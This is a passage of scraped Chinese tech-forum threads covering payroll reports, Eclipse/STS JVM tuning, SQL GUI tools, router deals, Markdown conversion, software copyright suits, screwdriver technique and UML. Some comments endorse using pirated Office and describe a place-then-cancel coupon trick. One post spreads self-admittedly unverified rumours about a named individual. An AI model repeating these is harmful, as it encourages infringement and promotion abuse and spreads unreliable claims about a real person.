原生控件实现，所谓的库就是这部分工作的封装和简化（平板是否考虑？）；另一部分是使用打印机的 api 解释最终的报表并打印", "Github 上有把 foxpro 数据文件转 csv 文件的东西。\r", "\r", "方案一、继续用 foxpro 开发。\r", "\r", "方案二、先数据迁移到 SQLite ， Qt 提供 GUI 界面，处理打印报表。", "看了一下楼主的报表格式，应发有 3 个来源，这些是来自管理系统的不同模块。\r", "比如基本工资，是来自员工基本资料；绩效工资来自平时的考核模块；加班工资来自加班统计管理模块。\r", "应扣也是从不同模块统计过来的。\r", "如果你想最终生成这样一张报表，你还是需要其他管理模块进行数据“输入”的，不然你想“输出”这张报表不是简单找个什么工具什么库就可以自动生成的。\r", "最简单的是 excel ，员工基本工资一张表、绩效考核一张表、加班统计一张表、请假迟到一张表，然后利用公式计算计算，完全可以。打印格式好做的。\r", "如果是不想用 excel 来做，其他工具 delphi 、 c#等都可以搞定，利用报表控件很方便的。但是数据来源一定要有的。所谓的报表就是多表组合查询生成想要的数据表呗", "PowerBi", "Tower 旗下的知人可以试试。国内应该不止一家在做，有现成的产品。", "不用 EXCEL,WPS,EXCEL 应该还是免费的吧.\r", "要定制软件,有积累代码库的话,就简单.没有就麻烦.出个 10K,四线城市应该有人可以给你上门搞定还包售后.", "是的，挺麻烦呢，身材好颜值高的离婚女性，带女儿。\r", "\r", "当然，我是正经人。\r", "\r", "主要是要打印挺麻烦，以前的那套代码看下来也很累太久了， FoxPro 早忘光了", "身材好颜值高，你就掏钱买个 office 给她吧，商业版好像也就一千多，而且小公司用盗版应该也没关系。", "楼主别想着做好人好事了，我家那位就是做工资的，本来我也想着给她写个程序搞定自动化处理，后来发现各种事项非常繁琐步骤繁多，没个几万块钱预算的工作量完不成，于是放弃了", " 楼主估计就是想通过麻烦事情增加交流就会，说错不要打我", "SQL server reporting", " 是的，我没做过这玩意，低估了……", "没人提 power bi?免费版够用了", " 做这样的程序不是难事 :)", "EXCEL 玩的好，已经够用了，模板做好，自动生成总报表。\r", "不想用盗版 office ，就用 wps 呗。", "power bi 是不是偏重分析一些", " 我可以免费帮你做：）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT ，这是 sts.ini ，我觉得我已经调整的挺大的了。</p>\n<pre><code>-startup\nplugins/org.eclipse.equinox.launcher_1.3.100.v20150511-1540.jar\n--launcher.library\nplugins/org.eclipse.equinox.launcher.win32.win32.x86_64_1.1.300.v20150602-1417\n-product\norg.springsource.sts.ide\n--launcher.defaultAction\nopenFile\n--launcher.XXMaxPermSize\n256M\n-vmargs\n-Dosgi.requiredJavaVersion=1.7\n-XstartOnFirstThread\n-Dorg.eclipse.swt.internal.carbon.smallFonts\n-server\n-Xmn256m\n-Xms2048m\n-Xmx4096m\n-Xss8m\n-XX:PermSize=1024m\n-XX:MaxPermSize=1024m\n-XX:+UseParallelGC\n\n</code></pre>\n<p>公司要求用 eclipse ，我习惯用 sts 。</p>\n<p>在不换 ide 的情况下，怎么减少这种假死（未响应）次数呢，内存 8G 。</p>\n<p>CPU 、内存都是只用 80%，还没爆。</p>\n</div></div>"], "reply": "4", "tittle": "Spring Tool Suite 老是假死 怎么破", "comment": ["假死可能有两个原因：\r", "一、 GC 引发的 STW\r", "二、 Eclipse 4.x 的自身的性能问题， Eclipse 4.2 发布后报漏出来很大的性能问题，这个也是官方承认的，见下面\r", "    ", "\r", "   官方的说法是没钱没资源所以发布前没做性能测试，虽然 Google 随后赞助了一些资金，但是性能问题在 4.x 中一直\r", "    存在，根本没有得到彻底性解决，为此 Eclipse 还新增了一个“ UI Responsiveness Monitoring\"功能，然没有卵用，个\r", "   人猜测是 E4 的架构问题导致，总之 E4 就是一个又丑又慢又垃圾的作死产物，很多人都认为 Eclipse 自己把自己玩死了，\r", "   .............扯远了，见谅，，总之如果你要用 Eclipse 4.x ，一定要用最新版，目前应该是 4.6.2 。\r", "\r", "解决办法：\r", "    针对第一个原因，调整你的 JVM 参数，说实话你的 GC 参数够烂，以减少 GC 次数和降低 STW 的停顿时间为目标，并不是 Heap 越大越好，你搞 4G 的 Heap ，一次 Full GC 停顿好几秒甚至十几秒，不卡死你卡谁啊，另外 GC 新生代并行收集器，旧生代 CMS ，打开你的 GC Log,不看 GC 日志的调优都是刷流氓。初始值和最大值设置成一样的，新生代整个 Heap 的 3/8,自己算，启动 STS 重新编译一次项目，根据你的 GC Log 内容调整你整个 Heap 大小和新生代大小， 3/8 只是官方建议值，没啥实际意义，肯定要根据自己的情况做调整的。永久代可以 384m,512m 这些，初始和最大也搞成一样的，你搞 1G 明显是浪费，你有那么多 class 吗，\r", "\r", "针对第二个原因，升级你的 STS 到最新版，每个项目都要关掉 Validation,去除 JavaScript Facets ，话说 Eclipse 做的 JSDT 插件是我见过最烂的 js 插件，还不如不做呢，基本上 Eclipse 假死都是 JSDT 这货搞的。\r", "  ， Eclipse 基本已经完蛋了，又没钱又没开发资源，死抱着它的”大平台“概念，不好好做 IDE ，光宣传它的平台有卵用啊，古时候同样功能的插件你总是能找到好几个不同的，现在都死的不能在死了，连个好的 Freemarker 编辑器插件你现在都找不到， 4.6.x 才加了一个 JSON 编辑器，但是连个 JSON 格式化都没做好，根本就是一个半成品......总之就是如果条件允许赶紧换 IDEA,甚至 Netbeans 都比 Eclipse 强。\r", "\r", "附上我的 eclipse.init 供参考，同时编译几个大的项目也从来没有卡死过：\r", "\r", "-startup\r", "../Eclipse/plugins/org.eclipse.equinox.launcher_1.3.201.v20161025-1711.jar\r", "--launcher.library\r", "../Eclipse/plugins/org.eclipse.equinox.launcher.cocoa.macosx.x86_64_1.1.401.v20161122-1740\r", "-showsplash\r", "org.eclipse.platform\r", "--launcher.defaultAction\r", "openFile\r", "--launcher.appendVmargs\r", "-vmargs\r", "-Dosgi.requiredJavaVersion=1.8\r", "-Xms1024m\r", "-Xmn384m\r", "-Xmx1024m\r", "-XX:MetaspaceSize=256M\r", "-XX:MaxMetaspaceSize=384M\r", "-XX:+DisableExplicitGC\r", "-XX:+PrintGCTimeStamps\r", "-XX:+PrintGCDetails\r", "-verbose:gc\r", "-Xloggc:gc.log\r", "-Duser.language=en\r", "-Xdock:icon=../Resources/Eclipse.icns\r", "-XstartOnFirstThread\r", "-Dorg.eclipse.swt.internal.carbon.smallFonts", "把 Eclipse 内置的 Task List 相关插件都禁用。另外 STS 性能也不好", " 感谢感谢，等两个小时等来个高质量回复", " 好的，我试试"]},
{"content": ["<div class=\"topic_content\">我现在准备用 postgresql, 觉得手写 sql 语句不够方便, 又容易出错.\r<br>想问问有没有什么软件连上 postgresql 以后, 可以通过 1.选数据库, 2.选表, 3.选字段, 4.为字段指定值 (可以改变字段名的顺序就更好了) 这几个步骤就可以构造出一条 sql 语句.</div>"], "reply": "9", "tittle": "有没有可以构造 sql 语句的 gui 软件", "comment": ["navicat 、 DataGrip", " navicat 还有这功能，怎么使用？", "几乎所有的 gui 都都可以。。请自行研究", "这种方法最不方便了，真的挺浪费时间的", "其实我只要字段自动补全就行", "sql server SQL Prompt 在写 sql 语句领域无人能敌。", " #2 比如说表结构 你修改完表结构不要保存最右边一个 tab SQL 预览 就可以看到 sql 了 如果数据的话 你可以右键数据复制为 insert 语句或者 update 语句 其他的大概就是这些啊.", " thanks", " #6  datagrip 可以比一比"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>某宝上推送过来今天 629 ，亏大了，前几天入了 AC66U-B1 都 679</p>\n</div></div>"], "reply": "41", "tittle": "AC68U 今天 629 啊", "comment": ["链接，快！", "AC66U-B1  前段时间京东 599 的\r", "我入了一个", "京东 801 买的, 送了一个 usb 网卡", "799 入的, 保价要几天内?", "马云家还是算了", "链接呢？", "  @", "  链接能贴么，不会被认为广告吧，说一下店铺吧 -  [午饭无线] ", "又降了 1 元， 628", "为什么我看了 999", " 某宝，不是某东", "某宝已上车，谢楼主", " 链接 base64 一下，感恩！", "简单看了一下这家卖的不是全新机器啊", "还是等二手东降价吧", "京东 799 入的，这路由器还不错。", "看起来型号应该是 TM-AC1900 ，本来就比 68U 便宜吧", "  美版全新，上面有写，表面有一些运输痕迹", "B1 今天加卷 599 。。。\r", "性能其实 B1 主频比 68 还高 200", " 刚刚看了下某东，确实是 699 了，券哪里领？", " #19 以旧换新可以弄一张-100 的券。然后再把以旧换新的订单取消掉。这个玩法已经存在很久了。", " #19 66u b1 刷了梅林无线跟 68u 是一毛一样的， CPU 还略胜 68u ，所以根本没买水货的理由。狗东保修还好。", " 66u b1 能双线么？双拨？", " #22 这是软件层面的。梅林是支持的，具体效果我没尝试过。", " ok ，准备撸一个回去试一下看看", "买美版的挺便宜啊", "想问下极路由 4 增强版怎么样？ 我就只想信号稳定的...穿墙能力还行的就 OK 了", " 仔细看了一下他们家的中差评里面带的图片\r", "我反正是不信这个是全新机器\r", "至于你们信不信，这是个人自由。。。", " #18 不错，撸了一个", "恩山上看有活动", "午饭的东西慎买…", "已入 AC 66U ，搭车出在用小米 mini ，已刷 breed+padavan 固件。见 ", "EA6900 飘过...", "66u b1 不能竖着放啊 有点纠结啊…", "  有哪些路由器可以竖着放，因为不能竖着放，这理由 。。。。。", " 仔细看了下结构 好似没有底座立不稳 也许就是这个原因吧，已经下单了 有东西靠着应该没问题了", "话说楼主不是在找 500 内的路由嘛", " #33 \r", "\r", " ", "  \r", " ", "  \r", "\r", "自己做支架，哈哈", " 哈哈哈,看到你这个笑尿\r", "和 AC86U 一模一样", "66ub1 比 68 好啊", "66 b1 用固件和 88 一样，比 68 好。", "  用手机 APP 在那个二手里面有个以旧换新的路由器活动， 3XX-100 的。你先随便选个型号只要满足 3XX 就可以，然后换新卷就给你了，之后再取消订单。"]},
{"content": ["<div class=\"topic_content\">比如这个网站 mesoscn.cn ，如何使用 <a target=\"_blank\" href=\"https://github.com/Dataman-Cloud/Mesos-CN\" rel=\"nofollow\">https://github.com/Dataman-Cloud/Mesos-CN</a>  生成？\r<br>\r<br>看到过好几个类似的网站。</div>"], "reply": "7", "tittle": "MD 文档如何方便的转换为 HTML？", "comment": ["[markdown2]( ", ") 可以在代码里面调用，同时还有命令行工具", "Bump - 继续找答案\r", " 谢谢 这种实现不是期望的方式，略复杂", "sublime  插件", "在线 MD 编辑器( ", " Html", "再补充一下,你看的这个 Mesos-CN 的网站用的 gitbook 这个工具把 md 的网页,然后映射的域名", "为了你这个问题我捣鼓了一晚上了,给你看下我做的的,这确实是个好东西\r", "\r", "刚发现 ", " 上线了，虽然文档有些旧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想找些违反开源协议的司法案例，没找到，倒是看到下面这些</p>\n<p><a href=\"http://wenshu.court.gov.cn/content/content?DocID=06c259ff-f31e-4921-bffb-3ea8d1861e52\" rel=\"nofollow\">http://wenshu.court.gov.cn/content/content?DocID=06c259ff-f31e-4921-bffb-3ea8d1861e52</a></p>\n<p><a href=\"http://wenshu.court.gov.cn/content/content?DocID=1471e570-682e-4303-b439-46d19f2f8d2e\" rel=\"nofollow\">http://wenshu.court.gov.cn/content/content?DocID=1471e570-682e-4303-b439-46d19f2f8d2e</a></p>\n<p>......</p>\n<p>说的是 Serv-UFTP 版权方磊若公司起诉了一大堆公司侵权</p>\n<p>看了有没有获得一些启发呢</p>\n</div></div>"], "reply": "8", "tittle": "Serv-U FTP 版权纠纷", "comment": ["啥启发，这两个案例都不是针对开源协议的啊", "这家公司是扫全网的 ftp 来抓人把柄了吧……不是找我买的就是盗版，这个貌似有点牛逼", " \r", "该怎样用法律维权，起诉前又该怎样有效固定证据  \r", "若是被冤枉的，又该如何答辩，该怎样有效证明自己主张  \r", "外包合同中应如何将这类风险考虑进去  \r", "用盗版的法律风险  \r", "......\r", "除了道德谴责 法律并非摆设", "侵权无处不在，有些是故意的，有些却是掉在别人设好的坑里，例如侵害 xxx 专利。", "你听说过 Oracle 吧（手动滑稽）", "还没有人开推荐免费的替代品？", "用盗版就要有这个觉悟呀，特别是公司使用。", "这都是小 case 了，什么 oracle ， autocad 比这个不知道高到哪里去了\r", "微软是用的多了，而且可以 office 和 win 一起买，大企业一买一大包，反倒不是啥负担\r", "\r", "oracle 才是真黑。。而且他算钱特有一套"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>关注覃超的人，知乎上应该很多，一开始觉得是一个很厉害的 Facebook 工程师。而且还经常贴出自己是搞 ACM 的（但从来没贴出 ACM 成绩），那看上去应该是个技术大牛了。</p>\n<p>然而他早已不在 Facebook 工作多时，至今仍挂着 Facebook 的 title 给尚没有出过国甚至用过 Facebook 的人各种鸡汤。</p>\n<p>之前还听某 QQ 群说他现在在经营什么怎么教你进 Facebook ， Google 等湾区大公司的生意，还不时在朋友圈秀“成果”，宛如一个留学中介一般。</p>\n<p>其次就是听某些业内的朋友说，覃超现在在 FreeS ，做技术合伙人，但是一个 VC 有什么 Tech 可言，据说是因为 FreeS 看重了覃超在知乎的地位，想拉粉丝才让他入伙，即可以猜测他现在在各自媒体， Tech 平台，甚至工作都是拜在知乎的活跃所赐。</p>\n<p>最后就是据某匿名程序员社区称，覃超和知乎公司高层还有很多关系，业内似乎也与知乎有投资关系，这个匿名消息，真假不得而知，我只是写在这里。</p>\n<p>而类似 Airbnb ， ali 这些企业招人覃超都有在知乎招手，足以见得用大厂名头在国内宣传给自己的带来的明星效应了。\n一位湾区大牛在我面前渐渐的褪去光环，我看到的是一个格调肯定不能算高的人。</p>\n<p>而且大家都是做技术的，他从来不讲技术，不讨论技术，天天和别人说些故事，扯一下自己的鸡汤，然后听着众，这简直太适合在大公司养老了几年想出去但是不懂干嘛的人了。复制这个也太简单了，只要我是 xxx 湾区大厂（反正把这个厂名字打出去的有前同事不是我）我只要说我和他们谈笑风生（反正也都是外国人，不会戳穿我）然后现在自媒体发达，像唐骏那样搞搞（但唐骏无疑是比覃超强的实力派），我还可以开个什么 Google 培训班，其实不就是刷题嘛，大家都懂得。那我也可以在帝都是个成功人士，难说房子都指日可待了.</p>\n</div></div>"], "reply": "15", "tittle": "找到了个大厂老程序员的出路", "comment": ["其实各个公司的部分领导，很多有着大厂出来的经历（其中还有造假的），有本事的又有多少呢？\r", "\r", "之前公司 CTO （做服务器的）水的可以，服务器天天出问题，但是又能怎样呢？即使被公司开了，下一份工作还是 CTO 。", "想到了我的经理居然觉得 abc123 拆分成 abc 和 123 很难···\r", "\r", "立马申请去其他项目组了 (￣▽￣\") ···", "那你想怎样？来个 react 连载？我现在基本不看那些水技术文，要搞直接官方文档，有疑难 google 。", "覃超就是转型做运营了。", "github 要比再好的 linkedIn 都可信\r", "\r", "突然想念那个叫海贼王的男人了", " 哈哈哈没几个 repo ，还都是 fork 的。。。", "网红经济嘛。\r", "\r", "相比认真做技术，这样的收益 /付出比明显更高。", " 想起池建强。。。。", " 更正一下，他是海贼——王路飞： P", "  Feng...", " 你是想说 fenng 吧", "看过 caoz 的公众号就知道，这叫建立个人影响力", "勃学家默默路过。。。", "即使隔着屏幕，长舌妇的气息扑面而来"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人非天生神力，可是生活中总是会把螺丝拧花。有时候有些重要的螺丝，被我一拧就花了，简直哭笑不得。而且越小的螺丝我就越容易花，真是怀疑人生。</p>\n<p>比如之前我的笔电要加固态，第一次拆笔电的后盖，看见那种黑色的小螺丝我就有点怕，用淘宝买硬盘架送的小螺丝刀（银色全金属的）轻轻地拧，顺逆时针都拧不开，我就加大一点力度，螺丝没动，就花了。这种场景我见过无数遍，就不敢乱动，拿去笔电的官方售后点，厚着脸皮叫维修小哥帮我拧开。小哥也好人，就帮我免费拧开螺丝让我自己装。但是我也想不懂，小哥用那种跟我差不多小螺丝刀，只不过他的螺丝刀是在刀头上有一小截是黑色的，他一用力就开了。我当时说我经常拧花，这螺丝刀有什么名堂，他说没有，他也是普通地用力而已。</p>\n<p>我还真想不通，难道是我用的普通螺丝刀硬度太高？有 V 友解答一下嚒，怎么拧，怎么买螺丝刀？</p>\n</div></div>", "<div class=\"topic_content\">感谢各位支招，本人用力不当+没使用合适螺丝刀是主因，已下单 S2 。\r<br>为后人（懒得看评论的）总结一下，大家跟我念：\r<br>顺时紧，逆时松。七分顶，三分拧。器材要合适，花了皮筋治 ;-P</div>"], "reply": "87", "tittle": "一直想不明白为什么螺丝总是被我拧花？", "comment": ["一定要用合适号的螺丝刀", "买盒螺丝刀套装，每个螺丝都用最大口径的去试，塞不进那个十字槽再换个小一号口径的。你是因为你的螺丝刀的口径远小于螺丝的口径。", "> 用淘宝买硬盘架送的小螺丝刀\r", "\r", "你得买正规的螺丝刀，别贪便宜", "几种可能：\r", "螺丝太紧\r", "螺丝刀太小\r", "螺丝刀口径不对\r", "姿势不对", "楼上说的合适的螺丝刀，再加上好一点强度大的，好用力，我买了一套 s2 钢的，非常好用", "我知道我知道，上次当着同学的面说拧不开，他说你能不能稍微用点力。。。", "开始拧之前就要找个前头能完全塞进去的螺丝刀。。。\r", "小了，或者前面尖部太长，螺丝刀侧面与螺丝的侧面接触面太小，就容易滑牙。。\r", "\r", "开始拧的时候就要使劲往下压着，如果小心翼翼的轻轻搞，那一直就是在滑牙，全都磨光了。。。\r", "开始使劲压住拧松后，再就不用那么用劲了。\r", "\r", "开始要慢，一旦你手上感觉要滑牙，那么马上停下，一定不要打滑，打滑就会把螺丝磨坏。\r", "1 、再用点劲往下压住。\r", "2 、换个合适的螺丝刀。\r", "这个手上感觉要注意。。。\r", "\r", "我见过一个楼主拆螺丝都是一开始就在滑牙，螺丝刀根本不合适，用力也不对，然后回来喷螺丝质量差。当时我喷那个楼主说他不会用螺丝刀，他回过来喷我，“喷了，螺丝刀还要怎么用？”\r", "我没说话。。。", "请买 s2 螺丝刀……", "专业打螺钉的告诉你，用尽力量顶住头部", "十字螺丝需要向前用力顶着拧，不然很容易花", "你的螺丝刀不合适 或者出现锯齿 \r", "如果你发现需要很用力 说明该换一把了", "配合适配套的螺丝刀头，然后买个电动起子，带正反转，小号拿着不累的就行……", "下次用刀头顶着橡胶圈试试看", "顺时针是上紧，逆时针是松开。", "说明你力量不够，要用力压下去，再转", "所以借楼问一下…已经拧花的螺丝要怎么办（也是笔记本中硬盘架螺丝）？", " 如果凸起的比较多的话，试着用镊子拧一下 ，但是这个需要一个巧劲，有时候摩擦力太小会很滑", "螺丝刀太差。买一套质量高点的就好。", "拧螺丝的时候要用力，或许稍微滴点油会轻松点", "刀头太硬，用力方式不对就花了\r", "买套南旗 S2 套装，淘宝 99 那款，很好使", "螺丝刀小了，然后用力过猛就这样了，答案就是 螺丝刀与螺丝不匹配", " 你需要黑科技\r", "m.miaopai.com/show/channel/yziimc9ROCrxDfT2Wip01KXff42D3RUM", "批头和螺丝不匹配，十字的头有 3 种规格，\r", "一字有 3 种，", "因为拧螺丝要用力顶住，并不是施加一个纯扭矩。", "你需要一套反牙", "我也老是拧花。。。", " 双面胶有时候可以解决", "其实螺丝质量差而已", "一拧就花，还是螺丝质量不行，虽然大部分螺丝都是标准件，但是材料工艺不过关。", "因为大部分螺丝材质太差", "螺丝刀问题  同型号 黑色的螺丝刀 头比较宽 质量好 普通螺丝刀头很尖 容易花", "既然你连哪个方向都不知道，八成是你姿势不对", "螺丝刀问题", "螺丝刀的问题。\r", "\r", "合适的螺丝刀不用往下按，对上螺丝孔只用使旋转的力就能轻松拧开。\r", "\r", "不合适的螺丝刀，费老大的劲往下按，一拧就花", "也有可能是你用力姿势不对，或者螺丝刀对准螺口施加的力不对。", "买一套好一点的螺丝刀套装", "(然后用力顶住)", "用力压住然后再拧，力量到了螺丝刀略有点不匹配问题也不大，我猜你最大的问题就是没有用力压。", "死吧，虫子", "螺丝尺寸不对是罪魁祸首，先轻轻地转，感觉不对就不要拧了，换一把螺丝刀，和螺丝吻合度越高越不容易花，也越省力\r", "尺寸不对不只是直径不对，也有可能是刀头的形状不对，比如太尖，十字刀两边夹角过小之类的\r", "年前刚把自己的笔记本螺丝拧坏，就是因为当时新买的老 A 螺丝刀套装只有 2.0 和 3.0 的，但我需要 2.5 的\r", "再加上螺丝刀前面太尖，两边夹角偏小，刀头又硬，反而不如自己 2 块钱在五金店买的小螺丝刀好用\r", "如果有合适的螺丝刀，拧螺丝不需要费多大力的", "你的螺丝刀需要买好的，需要匹配", "说错了，是螺丝刀尺寸不对是罪魁祸首。。。", "七分顶，三分拧，螺丝刀再烂也不会比螺丝还软。", "十字花的螺丝刀前面很尖的 你要稍微磨一下  你可以用一字的螺丝刀", "号一定要对，你非要用小一号的螺丝刀，不花才怪\r", "用力按，一定要用力按，越用力，越不容易花", "只是偶尔拧拧的无所谓， x 报上卖螺丝的多的是，都很便宜，换了就是", "明显螺丝刀不行。", "要顶住！", " 顶一个宽的橡皮筋", "和手法也有关系。\r", "七分压三分拧，一定要压住螺丝刀，不然一定花。", "螺丝刀大小要合适，太小了，水平方向容易只有边角吃力自然容易坏，太大了，插不进去竖直方向上又只有边角吃力了。\r", "\r", "另外拧螺丝要向下顶死了，不要怕压坏了螺丝下面的结构一般没那么脆弱，而且开始拧的前半圈力主要还是向下压螺丝，拧的松一点了就可以不用压直接拧了。", "拧螺丝要用静力..", "和说个事吧，螺丝口在设计是就稍微留了一点，会比匹配的螺丝刀稍微大一点点用于容纳灰尘。\r", "\r", "而有些专业螺丝刀就故意把这个也考虑了，也稍微做大一点。不过我说的，你应该不会遇到。", "有些螺丝刀会配横杆(表现就是螺丝刀手柄上会有孔)\r", "用力压，然后拨动横杆就行了。", "你需要一个电起子....", "稍用力顶住头部扭，合适大小的螺丝刀，前端大部分进入凹槽就不容易扭花。\r", "绝大多数情况和螺丝刀没啥联系……我们也用过不少用小铁片什么的来扭螺丝的。", "批头不行， lz 试试看 WIHA WERA PB  PH00 PH0 PH1 PH2 各来一把就知道区别了", "真的只是螺丝刀不行", "尺寸不匹配\r", "我遇到过很多次了", "拧螺丝其实是个稍复杂的力学过程，实际螺丝拧紧时为了防脱，都会施加一定的预紧力，有些螺丝还涂耐落漆防止松动。下螺丝的过程就是反向用力曲线，先增加力超过一个高点，让预紧力屈服，就是拧松。这个过程转角很小。后面扭力降低。\r", "\r", "作为人肉力矩扳手，实际操作时在拧松过程首先螺丝刀要匹配螺丝，用力抵住，都是避免螺丝刀和螺丝发生相对滑动（拧花）。然后逐渐加力，但是不要急于转动角度（拧花）。感受到预紧力屈服后，再开始连续转动。", "油管上有个拧花螺丝的补救办法与你分享，先找一个橡皮筋压在十字螺丝纹路上再用螺丝起子拧就能搞定了，你试试。", " Wow ，好棒", "螺丝刀和螺丝的尺寸和种类一定要匹配。十字螺丝有 2 种， PZ 头和 PH 头，只有细微的差别。", "你需要 ifixit 套装", "左松右紧 。怕搞花，每次搞的时候垫一张薄纸", " \r", "前段时间刚刚拧滑了一个，然后用刀子在那颗螺丝表面硬生生的磨出了一个一字的纹路然后用一字螺丝刀搞定，注意不要磨得太厉害，因为笔电硬盘处的小螺丝都很薄。", "因为你往下的力量太小了，所以会花\r", "越小的螺丝越要往下加重力才行。", "主要还有原因就是现在有些螺丝故意做的很容易花……", " \r", "用锯或者锉刀改成一字的螺丝。", "你是不是用尖头十字去拧小号的螺丝了 ，小号的一定要用平头的，尖头的斜角会拧花小螺丝，顺便推荐一波 wow 的电动螺丝刀，方便好用", "螺丝材质软，或者你用的螺丝刀不匹配。", "南旗 S2 +1", "千万不要拧太紧！！！！\r", "很多时候不是拧的紧就好，合适才是硬道理", "买比螺丝软的螺丝刀的话，下次你就该发帖「一直想不明白为什么螺丝刀总是被我拧花？」了", " 哥，你学力学的？楼下有人说不要拧太紧，有道理不？拧到稍稍有点紧不会至于松出来的程度不会有问题吧？求科普", " 松紧度合适的意思就是不同规格的螺丝，在特定的工件上都有自己的扭矩标准。设定好扭矩，拧到螺丝刀发出咔嗒信号就松紧合适了。\r", "\r", "人肉扭矩扳手就只能靠感觉，不可言说。", "两点\r", "\r", "1 ，当然是螺丝刀要匹配\r", "2 ，是即使是拧松，也要用力往里压住！你拧花了不是用力太大而是用力太小。往里顶的力太小了，就容易让螺丝刀和螺丝之间相对滑动。", "我也有盒南旗 s2", "有些螺丝里面是沾过胶或者漆的，为了防止松动。拧花这种螺丝很正常。 1.用力顶住小角度拧。 2.合适的螺丝刀。", " 回复点错了，这要看松紧程度，空间大小。如果空间允许可以试试小钳子，楼上说的打磨成“一”字也可取，但笔记本毕竟是个脆弱的东西，小心操作。", "因为你的螺丝刀太烂，我之前也是这样  。后来淘宝买了一把几十块钱的螺丝刀，瑞士牌子的，名字忘记，再没发生过。", "这很正常！\r", "是螺丝不好！\r", "应该都是一字螺丝才好！或者其他的！总之十字螺丝都得花！", "以下几个原因之一\r", "\r", "1. 螺丝质量差\r", "2. 螺丝号数小且过紧，松开需要的力大于螺丝\r", "3. 使用了号数过小的螺丝刀\r", "4. 螺丝刀太烂，头部角度无法完整贴合螺丝卡槽\r", "\r", "\r", "增加下压力能解决一部分问题，也可能让问题更严重\r", "\r", "贴合稍微不紧的下压增加力可能不滑牙，也可能螺丝材质太软直接破坏螺丝规整的应力结构直接不吃力更滑", "上螺丝胶 到位就好了 不用一味拧紧", "要不工具太烂,要不方法不对,拧螺丝,三分靠拧,七分靠顶", "小螺丝刀（银色全金属的）\r", "=垃圾"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>学校里的老师当然是强调 UML 的重要性啦，从来不说把代码发他，永远都是让我把类图，时序图画出来给他，因为是小项目也没啥难度，画一画也行，没那么费力，我想那些庞大的开源项目会画这些图吗？ Hadoop,Spark 里类何其多啊，调用也多，画 UML 会让人吐血的吧，学术派总说越是大的项目越要 UML 图啊。各位大佬怎么看？</p>\n</div></div>"], "reply": "22", "tittle": "关于 UML，画还是不画？", "comment": ["我们学校的老师早就不让我们画 UML 了， UML 过时了，软件工程课程也是当做老古董讲一讲，都是搞敏捷开发 SCRUM 那一套。\r", "包括小学期的课程实践也是这样。", "越大的项目越需要 UML 的话，可以去 github 上统计一下那么多开源的大项目，究竟有多少在 repo 里面放了一个文件夹存 UML 图了，不是一目了然么。", "可能老师觉得看图比看代码简单多了。", "结合文档的话, 会画流程图, 越复杂的会越画, 这里的复杂不是项目本身的大小, 而是业务逻辑.\r", "举个例子:\r", "客户下单, 下单之后 ,确认支付, 然后 7 天之后自动评价,  评价的时候, 积分计算, 客户经验值计算. 整个这一条线下来, 还是应该画一下 对应设计到的类, 数据表等等, 不然过两天绝壁忘记了.", "复杂的业务模块不画到后面大家都忘了总体是怎么样的了.", "画流程图,好找设计问题还有就是重构也有个总体,要不重构一脸黑,还是要自己梳理出 uml 或其它的图来分析.", "  UML 和敏捷并不冲突， UML 在今天对业务复杂的系统也是有意义的。", "初学，需要画。时间是值得的。大项目也是一个一个小模块组合起来的。这是锻炼你的模块化和从下而上思考问题的方法。时间长了就没必要了，因为一个需求出来 uml 就在脑子里了。。", "我特意花了 500 大洋买了一个 uml 软件。用了两年，然后就很少用了。。确实觉得有些时候如果只是个人开发项目，代码就是 uml 图。有那时间多重构几遍自己的代码。况且有前面的底子在，所以 uml 图不画其实早就在脑子里画了一遍了，不是讲形式主义，实用主义比较好，根据自己的情况进行调整。\r", "最简单和最需要 uml 的例子就是，老大扔给你一个需求需要调研。你输出如果只是代码 demo ， 80 分。如果带 uml 设计，满分逼格送给你。再进行项目交接的时候把图扔过去就能开始讲。我最烦没有设计文档然后交接过来的项目。。。还得翻代码，恶心。\r", "\r", "结论就是，一个人，不需要。多人合作。多花的时间，会在将来带来回报。看你是追求眼前利益还是长远利益了", "其实画图的目的是为了把事情讲清楚。在这个目标下，形式可以多样化。\r", "现在大部分都以类似敏捷的做法在做项目，所以我最常用的做法是：\r", "框架画模块结构图，模块用文字描述逻辑和实现，关键 /复杂流程画时序图。\r", "UML 里也就只有时序图还在用了。\r", "类图、用例图这些早就不画了。没那闲工夫，而且很难跟得上变化。", "经典 UML 意义不大，不过可以借鉴一些表达的思路\r", "像 UML 那种画法，能让人累死", " github 上面的代码都是偏于技术的基础性服务吧，那个当然不需要 uml ，公司开发的大都是业务功能代码，谁会把那个东西往 github 上推，没有 uml ，开发起来很难。", "视项目规模而定；\r", "我司的大项目（年级别），从前期技术调查，选型，到概要设计，详细设计，方法说明，开发流程，开发规范，工具使用等各类文档都有记录，都有相关的版本追踪；其中也包括各类业务， DB ， WORKFLOW 的各类图表。\r", "\r", "大抵上做起来都是有抗拒的，但是碰到后期要扩展，要理清思路等的场合的情况下， 这类资料能起到很大的帮助。", "Hadoop 和 Spark 有人专门出书来讲工程的实现代码，这个待遇应该没法比。", "说不要画的应该没接手过那种一句话文档都没有的项目的。。\r", "代码再乱一点，哪哪都不敢动。。", " 可能老师不想让当年学的东西白学。。。", " 什么学校啊，羡慕。。。", "工作之后大家就会明白，一个项目不是你一个人搞得定的。而文档， UML 就是彼此协作的基础。能写出一个让新手也能看懂的文档是十分重要的技能。毕竟图形比文字和代码都要直观得多。", "工作中基本用不到 UML ，因为单元测试代码比看 uml 更高效（通常单元测试代码每次版本更新都会跟着更新，大家都会一起维护，因为要过 QA 那一关，如果是 UML 这类文档的更新就不是及时的了，有时不及时的更新反而会对后来的开发者引起误导，浪费时间），程序员之间即使用 UML 也是大概的用来描述类之间的关系，具体细节全看代码。", "以前从来不画，现在开始画了。有助于理清思路", "<del>当年老师甚至懒到一笔带过的怎么办....</del>总之从没画过", "平时实际用到的时候，画流程图和框架图多于 UML ，一般是准备好要向被人讲解代码时才画 UML"]},
